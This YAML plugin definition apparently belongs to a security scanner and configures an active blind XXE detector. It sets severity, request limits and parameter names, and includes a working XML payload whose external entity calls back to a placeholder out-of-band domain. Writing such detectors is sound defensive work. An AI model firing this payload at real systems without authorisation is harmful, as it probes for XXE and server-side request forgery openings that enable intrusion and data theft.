# File: plugins/xxe/xxe-oob.yaml
# What: Tier 1 active blind XXE detector using OOB oracle.
# Why: Blind XXE requires out-of-band callback to confirm; OOB oracle provides cryptographic correlation.

id: xxe-oob
name: Blind XXE (OOB)
description: Detects blind XML External Entity injection via out-of-band DNS/HTTP callbacks.
author: GASH contributors
severity: critical
tags: [xxe, blind-xxe, oob, xml, injection, ssrf]
safe: false
deep: false
active: true
requires_auth: false
max_requests: 50
phase: probe
order: 50
api_version: "1.0"
oob: required
tests: tests/fixtures/xxe-oob/
request:
  method: POST
  param_names: ["xml", "data", "payload", "content", "body", "input", "file"]
  payload: '<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://{{OOB_DOMAIN}}/xxe"> %xxe;]><foo/>'
oracle:
  name: oob